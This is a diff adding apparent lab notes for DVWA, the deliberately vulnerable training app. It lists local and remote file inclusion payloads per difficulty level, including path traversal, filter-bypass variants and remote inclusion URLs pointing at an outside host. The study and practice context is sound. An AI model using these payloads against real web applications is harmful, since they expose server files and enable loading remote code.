@@ -1,0 +1,19 @@
+# File Inclusion (Difficulty: Low)
+
+LFI:  http://localhost/DVWA-master/vulnerabilities/fi/?page=../../hackable/flags/fi.php
+RFI:  ?page=https://avrdc.org/
+
+
+# File Inclusion (Difficulty: Medium)
+
+LFI:  ?page=....//....//hackable/flags/fi.php
+RFI:  ?page=Https://avrdc.org/
+      ?page=hthttps://tps://avrdc.org/
+      ?page=httPs://https://avrdc.org/
+      ?page=httpshttps://://avrdc.org/
+
+
+# File Inclusion (Difficulty: High)
+
+LFI:  ?page=file:///xampp/htdocs/DVWA-master/hackable/flags/fi.php
+
